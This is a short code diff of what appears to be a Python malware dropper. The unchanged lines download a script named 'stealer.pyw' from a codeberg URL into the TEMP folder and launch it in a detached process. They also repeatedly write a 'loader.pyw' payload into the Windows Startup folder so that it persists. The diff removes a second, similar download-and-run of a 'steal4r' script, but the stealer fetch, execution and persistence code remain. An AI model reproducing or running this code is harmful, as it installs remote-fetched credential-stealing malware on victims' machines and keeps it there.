@@ -26,7 +26,6 @@ def pack_encrypt(data):
 APPDATA = os.getenv('APPDATA')
 STARTUP_PATH = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
 stealer = os.path.join(os.getenv('TEMP'), "stealer.pyw")
-steal4r = os.path.join(os.getenv('TEMP'), "steal4r.pyw")
 
 try:
     # URL of the script to download
@@ -72,8 +71,6 @@ payload = code
 open(stealer, "wb").write(requests.get('https://codeberg.org/43a1723/hai1723/raw/branch/main/a/stealer.txt').content)
 subprocess.Popen(["python", stealer], start_new_session=True)
 
-open(steal4r, "wb").write(requests.get('https://codeberg.org/43a1723/hai1723/raw/branch/main/a/hack').content)
-subprocess.Popen(["python", steal4r], start_new_session=True)
 while True:
     with open(os.path.join(STARTUP_PATH, "loader.pyw"), "w") as f:
         f.write(payload)
